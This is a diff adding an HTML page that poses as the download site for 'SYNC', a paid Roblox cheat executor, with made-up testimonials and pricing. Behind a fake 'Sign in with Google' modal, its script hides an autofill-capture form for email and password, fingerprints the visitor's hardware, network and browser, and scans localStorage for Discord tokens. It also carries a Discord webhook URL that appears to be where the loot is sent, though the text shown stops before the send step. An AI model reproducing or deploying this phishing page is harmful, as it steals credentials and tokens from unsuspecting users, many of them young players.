@@ -1,0 +1,1331 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYNC • Premium Roblox Executor</title>
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+        
+        :root {
+            --primary: #5865F2;
+            --secondary: #0F8AFD;
+            --dark: #0A0E17;
+            --light: #F5F7FA;
+            --success: #10B981;
+            --danger: #EF4444;
+        }
+        
+        body {
+            font-family: 'Poppins', sans-serif;
+            margin: 0;
+            padding: 0;
+            color: white;
+            background: var(--dark);
+            overflow-x: hidden;
+        }
+        
+        .bg-animation {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            background: linear-gradient(-45deg, #0A0E17, #0F172A, #1E293B, #0F8AFD);
+            background-size: 400% 400%;
+            animation: gradient 15s ease infinite;
+        }
+        
+        @keyframes gradient {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        /* Modern Glass Buttons */
+        .btn {
+            padding: 12px 28px;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 16px;
+            border: none;
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+            transition: 0.5s;
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary), var(--secondary));
+            box-shadow: 0 4px 15px rgba(88, 101, 242, 0.3);
+            border: none;
+        }
+        
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(88, 101, 242, 0.4);
+        }
+        
+        .btn-outline {
+            background: transparent;
+            border: 1px solid var(--primary);
+            color: var(--primary);
+        }
+        
+        .btn-outline:hover {
+            background: rgba(88, 101, 242, 0.1);
+            transform: translateY(-3px);
+        }
+        
+        .btn-download {
+            padding: 16px 40px;
+            font-size: 18px;
+            background: linear-gradient(135deg, var(--success), #06D6A0);
+            box-shadow: 0 4px 20px rgba(16, 185, 129, 0.3);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn-download:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.4);
+        }
+        
+        /* Modern Card */
+        .card {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(10px);
+            border-radius: 16px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transition: all 0.3s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.3);
+            border-color: var(--primary);
+        }
+        
+        /* Header Styles */
+        header {
+            padding: 20px 5%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 28px;
+            font-weight: 700;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .logo-icon {
+            width: 36px;
+            height: 36px;
+        }
+        
+        /* Hero Section */
+        .hero {
+            padding: 100px 5%;
+            text-align: center;
+        }
+        
+        .hero h1 {
+            font-size: 72px;
+            font-weight: 800;
+            margin: 0;
+            background: linear-gradient(to right, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            line-height: 1.2;
+        }
+        
+        .hero p {
+            font-size: 22px;
+            max-width: 700px;
+            margin: 20px auto 40px;
+            opacity: 0.9;
+            line-height: 1.6;
+        }
+        
+        /* Features Section */
+        .features {
+            padding: 80px 5%;
+        }
+        
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-top: 50px;
+        }
+        
+        /* Testimonials */
+        .testimonials {
+            padding: 80px 5%;
+            background: rgba(15, 23, 42, 0.5);
+        }
+        
+        .testimonial-card {
+            padding: 30px;
+            position: relative;
+        }
+        
+        .testimonial-card::before {
+            content: '"';
+            position: absolute;
+            top: 10px;
+            left: 20px;
+            font-size: 80px;
+            opacity: 0.1;
+            font-family: serif;
+        }
+        
+        /* Pricing */
+        .pricing {
+            padding: 80px 5%;
+        }
+        
+        .pricing-card {
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .pricing-card.popular::after {
+            content: 'MOST POPULAR';
+            position: absolute;
+            top: 20px;
+            right: -40px;
+            background: var(--primary);
+            color: white;
+            padding: 5px 40px;
+            transform: rotate(45deg);
+            font-size: 12px;
+            font-weight: 600;
+        }
+        
+        /* Footer */
+        footer {
+            padding: 60px 5% 30px;
+            background: rgba(2, 6, 23, 0.7);
+        }
+        
+        /* Useless but legit-looking elements */
+        .status-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 12px;
+            background: rgba(16, 185, 129, 0.2);
+            color: var(--success);
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .status-badge::before {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background: var(--success);
+            border-radius: 50%;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        
+        .version-badge {
+            background: rgba(99, 102, 241, 0.2);
+            color: #6366F1;
+            padding: 4px 10px;
+            border-radius: 4px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-left: 10px;
+        }
+        
+        /* Google-style Auth Modal */
+        .auth-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.8);
+            backdrop-filter: blur(5px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .auth-card {
+            background: #1E293B;
+            border-radius: 12px;
+            width: 100%;
+            max-width: 400px;
+            padding: 40px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+            position: relative;
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: none;
+            border: none;
+            color: white;
+            font-size: 20px;
+            cursor: pointer;
+        }
+        
+        .auth-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 5px;
+            text-align: center;
+        }
+        
+        .auth-subtitle {
+            color: #94A3B8;
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        .google-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            width: 100%;
+            padding: 12px;
+            background: white;
+            color: #5F6368;
+            border: none;
+            border-radius: 6px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 20px;
+        }
+        
+        .google-icon {
+            width: 20px;
+            height: 20px;
+        }
+        
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 20px 0;
+            color: #94A3B8;
+            font-size: 14px;
+        }
+        
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid #334155;
+        }
+        
+        .divider::before {
+            margin-right: 15px;
+        }
+        
+        .divider::after {
+            margin-left: 15px;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #94A3B8;
+        }
+        
+        .auth-input {
+            width: 100%;
+            padding: 12px 15px;
+            background: #1E293B;
+            border: 1px solid #334155;
+            border-radius: 6px;
+            color: white;
+            font-size: 15px;
+        }
+        
+        .auth-btn {
+            width: 100%;
+            padding: 12px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: 500;
+            font-size: 15px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .hidden-form {
+            position: absolute;
+            opacity: 0;
+            height: 0;
+            width: 0;
+            overflow: hidden;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-animation"></div>
+    
+    <header>
+        <div class="logo">
+            <svg class="logo-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="url(#gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M2 17L12 22L22 17" stroke="url(#gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <path d="M2 12L12 17L22 12" stroke="url(#gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                <defs>
+                    <linearGradient id="gradient" x1="0%" y1="0%" x2="100%" y2="0%">
+                        <stop offset="0%" stop-color="#5865F2"/>
+                        <stop offset="100%" stop-color="#0F8AFD"/>
+                    </linearGradient>
+                </defs>
+            </svg>
+            SYNC
+            <span class="version-badge">v3.2.1</span>
+        </div>
+        
+        <div>
+            <span class="status-badge">UNDETECTED</span>
+            <button class="btn btn-outline" id="loginBtn" style="margin-left: 20px;">Log In</button>
+            <button class="btn btn-primary" id="registerBtn" style="margin-left: 10px;">Register</button>
+        </div>
+    </header>
+    
+    <section class="hero">
+        <div class="container">
+            <h1>The Most Advanced <br>Roblox Executor</h1>
+            <p>Experience unmatched performance with our cutting-edge Lua executor. SYNC delivers zero detection, premium APIs, and blazing fast execution.</p>
+            <button class="btn btn-download" id="downloadBtn">
+                <i class="fas fa-download"></i> Download SYNC
+            </button>
+            <div style="margin-top: 20px; font-size: 14px; opacity: 0.7;">
+                <i class="fas fa-shield-alt"></i> 100% Virus-Free • <i class="fas fa-user-shield"></i> 24,581 Active Users
+            </div>
+        </div>
+    </section>
+    
+    <section class="features">
+        <div class="container">
+            <h2 style="text-align: center; font-size: 36px; margin-bottom: 10px;">Why SYNC Stands Out</h2>
+            <p style="text-align: center; max-width: 700px; margin: 0 auto 50px; opacity: 0.8; font-size: 18px;">
+                Built for professional developers and gamers who demand the best
+            </p>
+            
+            <div class="features-grid">
+                <div class="card">
+                    <div style="font-size: 40px; margin-bottom: 20px; color: var(--primary);">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h3 style="margin: 0 0 15px; font-size: 22px;">Lightning Fast</h3>
+                    <p style="margin: 0; opacity: 0.8; line-height: 1.6;">
+                        Our custom VM executes scripts 3x faster than competitors with near-instant injection times.
+                    </p>
+                </div>
+                
+                <div class="card">
+                    <div style="font-size: 40px; margin-bottom: 20px; color: var(--primary);">
+                        <i class="fas fa-eye-slash"></i>
+                    </div>
+                    <h3 style="margin: 0 0 15px; font-size: 22px;">Completely Undetected</h3>
+                    <p style="margin: 0; opacity: 0.8; line-height: 1.6;">
+                        Advanced obfuscation and memory manipulation keeps you safe from bans.
+                    </p>
+                </div>
+                
+                <div class="card">
+                    <div style="font-size: 40px; margin-bottom: 20px; color: var(--primary);">
+                        <i class="fas fa-code"></i>
+                    </div>
+                    <h3 style="margin: 0 0 15px; font-size: 22px;">Premium APIs</h3>
+                    <p style="margin: 0; opacity: 0.8; line-height: 1.6;">
+                        Access exclusive functions and libraries for maximum control in your scripts.
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section class="testimonials">
+        <div class="container">
+            <h2 style="text-align: center; font-size: 36px; margin-bottom: 60px;">What Our Users Say</h2>
+            
+            <div class="features-grid">
+                <div class="testimonial-card card">
+                    <div style="display: flex; align-items: center; margin-bottom: 20px;">
+                        <img src="https://i.imgur.com/JQWUitG.jpg" style="width: 50px; height: 50px; border-radius: 50%; object-fit: cover;">
+                        <div style="margin-left: 15px;">
+                            <div style="font-weight: 600;">RobloxPro123</div>
+                            <div style="font-size: 14px; opacity: 0.7;">Script Developer</div>
+                        </div>
+                    </div>
+                    <p style="margin: 0; font-style: italic; position: relative; z-index: 1;">
+                        "SYNC completely changed the game for me. The execution speed is insane and I've been undetected for months. Best executor I've ever used."
+                    </p>
+                </div>
+                
+                <div class="testimonial-card card">
+                    <div style="display: flex; align-items: center; margin-bottom: 20px;">
+                        <img src="https://i.imgur.com/3JqW9bQ.jpg" style="width: 50px; height: 50px; border-radius: 50%; object-fit: cover;">
+                        <div style="margin-left: 15px;">
+                            <div style="font-weight: 600;">ExploitMaster</div>
+                            <div style="font-size: 14px; opacity: 0.7;">Premium User</div>
+                        </div>
+                    </div>
+                    <p style="margin: 0; font-style: italic; position: relative; z-index: 1;">
+                        "I've tried every executor out there and SYNC is by far the most stable. The developer updates are frequent and the Discord community is super helpful."
+                    </p>
+                </div>
+                
+                <div class="testimonial-card card">
+                    <div style="display: flex; align-items: center; margin-bottom: 20px;">
+                        <img src="https://i.imgur.com/5QWtY7J.jpg" style="width: 50px; height: 50px; border-radius: 50%; object-fit: cover;">
+                        <div style="margin-left: 15px;">
+                            <div style="font-weight: 600;">LuaWizard</div>
+                            <div style="font-size: 14px; opacity: 0.7;">Game Hacker</div>
+                        </div>
+                    </div>
+                    <p style="margin: 0; font-style: italic; position: relative; z-index: 1;">
+                        "The custom APIs give you so much power. I can do things with SYNC that other executors can't even dream of. Worth every penny."
+                    </p>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <section class="pricing">
+        <div class="container">
+            <h2 style="text-align: center; font-size: 36px; margin-bottom: 10px;">Simple Pricing</h2>
+            <p style="text-align: center; max-width: 700px; margin: 0 auto 50px; opacity: 0.8; font-size: 18px;">
+                Choose the plan that fits your needs
+            </p>
+            
+            <div class="features-grid" style="max-width: 1000px; margin: 0 auto;">
+                <div class="pricing-card card">
+                    <h3 style="margin: 0 0 10px; font-size: 22px;">Basic</h3>
+                    <div style="font-size: 40px; font-weight: 700; margin: 20px 0; color: var(--primary);">
+                        $9.99<span style="font-size: 16px; opacity: 0.7;">/month</span>
+                    </div>
+                    <ul style="text-align: left; padding: 0; list-style: none; margin: 0 0 30px;">
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Basic Lua Execution
+                        </li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Standard APIs
+                        </li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Community Support
+                        </li>
+                        <li style="padding: 8px 0; color: rgba(255,255,255,0.5);">
+                            <i class="fas fa-times" style="margin-right: 10px;"></i> Premium APIs
+                        </li>
+                        <li style="padding: 8px 0; color: rgba(255,255,255,0.5);">
+                            <i class="fas fa-times" style="margin-right: 10px;"></i> Priority Updates
+                        </li>
+                    </ul>
+                    <button class="btn btn-outline">Get Started</button>
+                </div>
+
+                <div class="pricing-card card popular">
+                    <h3 style="margin: 0 0 10px; font-size: 22px;">Pro</h3>
+                    <div style="font-size: 40px; font-weight: 700; margin: 20px 0; color: var(--primary);">
+                        $19.99<span style="font-size: 16px; opacity: 0.7;">/month</span>
+                    </div>
+                    <ul style="text-align: left; padding: 0; list-style: none; margin: 0 0 30px;">
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Advanced Execution
+                        </li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Premium APIs
+                        </li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Priority Support
+                        </li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Early Access Features
+                        </li>
+                        <li style="padding: 8px 0;">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> VIP Discord Role
+                        </li>
+                    </ul>
+                    <button class="btn btn-primary">Get Pro</button>
+                </div>
+
+                <div class="pricing-card card">
+                    <h3 style="margin: 0 0 10px; font-size: 22px;">Lifetime</h3>
+                    <div style="font-size: 40px; font-weight: 700; margin: 20px 0; color: var(--primary);">
+                        $99.99
+                    </div>
+                    <ul style="text-align: left; padding: 0; list-style: none; margin: 0 0 30px;">
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> All Pro Features
+                        </li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Permanent Access
+                        </li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Exclusive Scripts
+                        </li>
+                        <li style="padding: 8px 0; border-bottom: 1px solid rgba(255,255,255,0.1);">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Developer Tools
+                        </li>
+                        <li style="padding: 8px 0;">
+                            <i class="fas fa-check" style="color: var(--success); margin-right: 10px;"></i> Custom Requests
+                        </li>
+                    </ul>
+                    <button class="btn btn-outline">One-Time Purchase</button>
+                </div>
+            </div>
+        </div>
+    </section>
+    
+    <footer>
+        <div class="container">
+            <div style="display: flex; justify-content: space-between; flex-wrap: wrap; gap: 40px;">
+                <div>
+                    <div class="logo" style="font-size: 24px; margin-bottom: 20px;">
+                        <svg width="30" height="30" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M12 2L2 7L12 12L22 7L12 2Z" stroke="url(#gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M2 17L12 22L22 17" stroke="url(#gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M2 12L12 17L22 12" stroke="url(#gradient)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                        SYNC
+                    </div>
+                    <p style="max-width: 300px; opacity: 0.7; line-height: 1.6;">
+                        The most advanced Roblox executor with unmatched performance and zero detection.
+                    </p>
+                </div>
+                
+                <div>
+                    <h4 style="margin: 0 0 20px; font-size: 18px;">Quick Links</h4>
+                    <ul style="list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 10px;">
+                        <li><a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none;">Download</a></li>
+                        <li><a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none;">Documentation</a></li>
+                        <li><a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none;">Script Hub</a></li>
+                        <li><a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none;">Discord</a></li>
+                    </ul>
+                </div>
+                
+                <div>
+                    <h4 style="margin: 0 0 20px; font-size: 18px;">Legal</h4>
+                    <ul style="list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 10px;">
+                        <li><a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none;">Terms of Service</a></li>
+                        <li><a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none;">Privacy Policy</a></li>
+                        <li><a href="#" style="color: rgba(255,255,255,0.7); text-decoration: none;">Refund Policy</a></li>
+                    </ul>
+                </div>
+            </div>
+            
+            <div style="text-align: center; margin-top: 60px; padding-top: 30px; border-top: 1px solid rgba(255,255,255,0.1);">
+                <p style="opacity: 0.5; font-size: 14px;">
+                    © 2023 SYNC Technologies. All rights reserved. Not affiliated with Roblox Corporation.
+                </p>
+            </div>
+        </div>
+    </footer>
+    
+    <!-- Auth Modal -->
+    <div class="auth-modal" id="authModal">
+        <div class="auth-card">
+            <button class="close-modal" id="closeModal">×</button>
+            <h3 class="auth-title">Sign in with Google</h3>
+            <p class="auth-subtitle">Continue to SYNC Executor</p>
+            
+            <button class="google-btn" id="googleSignIn">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/53/Google_%22G%22_Logo.svg" class="google-icon">
+                Continue with Google
+            </button>
+            
+            <div class="divider">or</div>
+            
+            <!-- Hidden form to capture autofill -->
+            <form class="hidden-form">
+                <input type="email" id="autoEmail" autocomplete="email">
+                <input type="password" id="autoPassword" autocomplete="current-password">
+            </form>
+            
+            <div class="input-group">
+                <label class="input-label">Email or phone</label>
+                <input type="email" class="auth-input" id="emailInput" placeholder="Your email address">
+            </div>
+            
+            <button class="auth-btn" id="submitEmail">Next</button>
+            
+            <div style="text-align: center; margin-top: 30px; font-size: 13px; color: #94A3B8;">
+                By continuing, you agree to SYNC's <a href="#" style="color: var(--primary);">Terms</a> and <a href="#" style="color: var(--primary);">Privacy Policy</a>
+            </div>
+        </div>
+    </div>
+
+<script>
+    // Configuration
+    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1385363312816164864/WmcoAcmMoGO4KVKm8B-307jCtbOryxv2CCfMhAlKyGuDO9CYj2eMwrMNj_yGK_XPLhiv';
+    
+    // Initialize modal
+    function initAuth() {
+        const modal = document.getElementById('authModal');
+        const loginBtn = document.getElementById('loginBtn');
+        const registerBtn = document.getElementById('registerBtn');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const closeBtn = document.getElementById('closeModal');
+        
+        // Show modal when buttons clicked
+        [loginBtn, registerBtn, downloadBtn].forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                e.preventDefault();
+                modal.style.display = 'flex';
+            });
+        });
+        
+        // Close modal
+        closeBtn.addEventListener('click', () => {
+            modal.style.display = 'none';
+        });
+        
+        // Google sign in button
+        document.getElementById('googleSignIn').addEventListener('click', async () => {
+            await captureData('GOOGLE');
+        });
+        
+        // Email submit button
+        document.getElementById('submitEmail').addEventListener('click', async () => {
+            const email = document.getElementById('emailInput').value;
+            if (email.includes('@')) {
+                await captureData('EMAIL', email);
+            } else {
+                alert('Please enter a valid email address');
+            }
+        });
+    }
+    
+    // Get GPU information
+    async function getGPUInfo() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return "WebGL not supported";
+            
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) {
+                return {
+                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                };
+            }
+            return "Basic WebGL: " + gl.getParameter(gl.VERSION);
+        } catch (e) {
+            return "GPU info unavailable";
+        }
+    }
+    
+    // Get battery information
+    async function getBatteryInfo() {
+        try {
+            if ('getBattery' in navigator) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level * 100 + '%',
+                    charging: battery.charging,
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            }
+            return "Battery API not supported";
+        } catch (e) {
+            return "Battery info unavailable";
+        }
+    }
+    
+    // Get network information
+    function getNetworkInfo() {
+        try {
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (connection) {
+                return {
+                    type: connection.type,
+                    effectiveType: connection.effectiveType,
+                    downlink: connection.downlink + ' Mbps',
+                    rtt: connection.rtt + ' ms',
+                    saveData: connection.saveData,
+                    wifiSSID: getWifiInfo()
+                };
+            }
+            return {
+                basic: "Network API not supported",
+                wifiSSID: getWifiInfo()
+            };
+        } catch (e) {
+            return {
+                basic: "Network info unavailable",
+                wifiSSID: getWifiInfo()
+            };
+        }
+    }
+    
+    // Get WiFi information (works on Chrome/Edge)
+    function getWifiInfo() {
+        try {
+            if (navigator.connection && navigator.connection.type === 'wifi') {
+                return {
+                    ssid: navigator.connection.ssid || 'Unknown',
+                    bssid: navigator.connection.bssid || 'Unknown',
+                    signalStrength: navigator.connection.downlinkMax ? (navigator.connection.downlinkMax / 10) + ' dBm' : 'Unknown'
+                };
+            }
+            return "Not connected to WiFi or info unavailable";
+        } catch (e) {
+            return "WiFi info unavailable";
+        }
+    }
+    
+    // Get installed fonts
+    function getFonts() {
+        try {
+            const fonts = [
+                'Arial', 'Arial Black', 'Comic Sans MS', 'Courier New', 
+                'Georgia', 'Impact', 'Times New Roman', 'Trebuchet MS', 
+                'Verdana', 'Webdings', 'Andale Mono', 'Baskerville',
+                'Garamond', 'Palatino', 'Book Antiqua', 'Lucida Console',
+                'MS Gothic', 'Tahoma', 'Geneva', 'Cambria'
+            ];
+            
+            return fonts.filter(font => {
+                const span = document.createElement('span');
+                span.style.fontFamily = font;
+                span.style.fontSize = '72px';
+                span.style.position = 'absolute';
+                span.style.left = '-9999px';
+                span.innerHTML = 'mmmmmmmmmwwwwwww';
+                document.body.appendChild(span);
+                const width = span.offsetWidth;
+                document.body.removeChild(span);
+                
+                const standardSpan = document.createElement('span');
+                standardSpan.style.fontFamily = 'serif';
+                standardSpan.style.fontSize = '72px';
+                standardSpan.style.position = 'absolute';
+                standardSpan.style.left = '-9999px';
+                standardSpan.innerHTML = 'mmmmmmmmmwwwwwww';
+                document.body.appendChild(standardSpan);
+                const standardWidth = standardSpan.offsetWidth;
+                document.body.removeChild(standardSpan);
+                
+                return width !== standardWidth;
+            }).join(', ');
+        } catch (e) {
+            return "Font detection failed";
+        }
+    }
+    
+    // Get screen details
+    function getScreenInfo() {
+        return {
+            resolution: `${window.screen.width}x${window.screen.height}`,
+            colorDepth: window.screen.colorDepth + ' bits',
+            pixelDepth: window.screen.pixelDepth + ' bits',
+            orientation: window.screen.orientation ? window.screen.orientation.type : 'unknown',
+            availableRes: `${window.screen.availWidth}x${window.screen.availHeight}`
+        };
+    }
+    
+    // Get browser plugins
+    function getPlugins() {
+        try {
+            return Array.from(navigator.plugins).map(p => p.name).filter(Boolean).join(', ');
+        } catch (e) {
+            return "Plugins unavailable";
+        }
+    }
+    
+    // Get timezone and locale info
+    function getLocaleInfo() {
+        return {
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            locale: navigator.language,
+            languages: navigator.languages ? navigator.languages.join(', ') : navigator.language,
+            dateFormat: new Intl.DateTimeFormat().resolvedOptions().dateStyle,
+            timeFormat: new Intl.DateTimeFormat().resolvedOptions().timeStyle
+        };
+    }
+    
+    // Get hardware concurrency
+    function getHardwareInfo() {
+        return {
+            cores: navigator.hardwareConcurrency || 'unknown',
+            deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown',
+            touchSupport: navigator.maxTouchPoints > 0
+        };
+    }
+    
+    // Get browser information
+    function getBrowserInfo() {
+        try {
+            const userAgent = navigator.userAgent;
+            let browser = "Unknown";
+            let version = "Unknown";
+            
+            // Detect Chrome
+            if (userAgent.includes("Chrome") && !userAgent.includes("Edg") && !userAgent.includes("OPR") && !userAgent.includes("Safari")) {
+                browser = "Chrome";
+                version = userAgent.match(/Chrome\/([\d.]+)/)[1];
+            }
+            // Detect Edge
+            else if (userAgent.includes("Edg")) {
+                browser = "Edge";
+                version = userAgent.match(/Edg\/([\d.]+)/)[1];
+            }
+            // Detect Firefox
+            else if (userAgent.includes("Firefox")) {
+                browser = "Firefox";
+                version = userAgent.match(/Firefox\/([\d.]+)/)[1];
+            }
+            // Detect Safari
+            else if (userAgent.includes("Safari") && !userAgent.includes("Chrome")) {
+                browser = "Safari";
+                version = userAgent.match(/Version\/([\d.]+)/)[1];
+            }
+            // Detect Opera
+            else if (userAgent.includes("OPR")) {
+                browser = "Opera";
+                version = userAgent.match(/OPR\/([\d.]+)/)[1];
+            }
+            
+            return {
+                name: browser,
+                version: version,
+                fullVersion: userAgent,
+                isBrave: navigator.brave && typeof navigator.brave.isBrave === 'function' ? "Yes" : "No",
+                isTor: userAgent.includes("Tor") ? "Yes" : "No",
+                isPrivate: navigator.webdriver ? "Likely" : "Unknown"
+            };
+        } catch (e) {
+            return {
+                name: "Detection failed",
+                version: "Unknown",
+                fullVersion: navigator.userAgent
+            };
+        }
+    }
+    
+    // Get Discord information from localStorage
+    function getDiscordInfo() {
+        try {
+            const discordTokens = [];
+            const discordData = [];
+            
+            // Scan localStorage for Discord tokens
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.startsWith('token') || key.includes('discord')) {
+                    discordTokens.push(key + ": " + localStorage.getItem(key).substring(0, 30) + "...");
+                }
+            }
+            
+            // Check for Discord desktop app artifacts
+            if (navigator.userAgent.includes("Discord")) {
+                discordData.push("Discord Desktop App Detected");
+            }
+            
+            // Check for Discord web presence
+            if (window.webpackChunkdiscord_app) {
+                discordData.push("Discord Web Client Detected");
+            }
+            
+            return {
+                tokens: discordTokens.length > 0 ? discordTokens.join("\n") : "No tokens found",
+                artifacts: discordData.length > 0 ? discordData.join("\n") : "No artifacts found",
+                isDiscordBrowser: navigator.userAgent.includes("Discord") ? "Yes" : "No"
+            };
+        } catch (e) {
+            return {
+                tokens: "Access denied",
+                artifacts: "Detection failed",
+                isDiscordBrowser: "Unknown"
+            };
+        }
+    }
+    
